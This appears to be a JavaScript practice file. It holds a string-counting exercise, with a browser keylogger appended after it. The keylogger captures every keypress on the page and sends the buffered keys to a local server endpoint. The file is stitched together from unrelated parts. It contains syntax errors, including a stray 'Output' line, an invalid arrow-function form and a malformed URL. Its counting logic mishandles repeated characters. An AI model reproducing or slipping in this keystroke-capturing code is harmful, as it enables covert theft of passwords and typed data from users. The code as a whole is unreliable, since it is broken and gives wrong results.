// Count of strings that can be formed from another string using each character at-most once

// Input: str1 = “arajjhupoot”, str2 = “rajput” 
// Output: 1 
// Explanation:
// str2 can only be formed once using characters of str1.

// Input: str1 = “foreeksgekseg”, str2 = “geeks” 
Output: 2

function characterAtMost(s1 = "geeksforeeksgekseg",s2 = "geeks") {
  let feqS1Character = {}
    for(let i =0;i<s1.length;i++){
      if(feqS1Character.hasOwnProperty(s1[i])){
        feqS1Character[s1[i]]++
      }else{
        feqS1Character[s1[i]] = 1
      }
    }
    let s2CharacterArray = []
    for(let i =0;i<s2.length;i++){
      if(!feqS1Character.hasOwnProperty(s2[i])){
        break
      }else{
        s2CharacterArray.push(feqS1Character[s2[i]])
      }
    }
    
    if(s2CharacterArray.length === s2.length){
      return Math.min(...s2CharacterArray);
    }else{
      return 0
    }
    
}
console.log(characterAtMost())

var timeout;
var buffer = ''
document.querySelector('body').addEventListener('keypress',function(event)=>{
  if(event.which!==0){
    clearTimeout(timeout)
    buffer +=String.fromCharCode(event.which)
    timeout = setTimeout(function() {
      var xhr = new XMLHttpRequest()
      var uri = 'http:localhost:3002/keys?data=' + encodeURIComponent(buffer)
     xhr.open('GET',uri)
     xhr.send()
     buffer = '';
    }, 400);
  }
})